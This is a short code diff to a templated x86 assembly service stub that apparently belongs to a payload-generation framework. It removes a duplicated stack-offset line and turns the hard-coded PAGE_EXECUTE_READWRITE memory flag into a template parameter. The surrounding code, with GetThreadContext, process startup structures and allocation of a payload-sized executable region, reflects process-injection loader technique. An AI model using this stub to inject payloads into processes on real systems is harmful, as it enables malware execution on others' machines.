@@ -76,7 +76,6 @@ servicemain:
   {% set stkoff_ctx = stkoff_store + sizeof_PTR %}
   {% set stkoff_si = stkoff_ctx + sizeof_CONTEXT %}
   {% set stkoff_pi = stkoff_si + sizeof_STARTUPINFO + 8 %} {# plus 8 for alignment to a 16 boundary #}
-  {% set stkoff_pi = stkoff_si + sizeof_STARTUPINFO + 8 %} {# plus 8 for alignment to a 16 boundary #}
 
   ; allocate space on the heap, layout looks like
   ; LPVOID               lpApiStart                         ; store a reference to the block api so it does not need to be included again
@@ -169,7 +168,7 @@ get_servicehandler:
   {{ api_call('kernel32.dll', 'GetThreadContext', arg1='ecx', arg2='edx') }}
 
   mov esi, esp
-  push 0x40                                                     ; PAGE_EXECUTE_READWRITE    (DWORD)  flProtect
+  push {{ permissions }}                                        ; PAGE_EXECUTE_READWRITE    (DWORD)  flProtect
   push {{ bw_or(MEM_COMMIT, MEM_RESERVE) }}                     ; MEM_COMMIT | MEM_RESERVE  (DWORD)  flAllocationType
   push {{ PAYLOAD_SIZE }}                                       ; dwSize                    (SIZE_T) dwSize
   push 0                                                        ; NULL                      (LPVOID) lpAddress
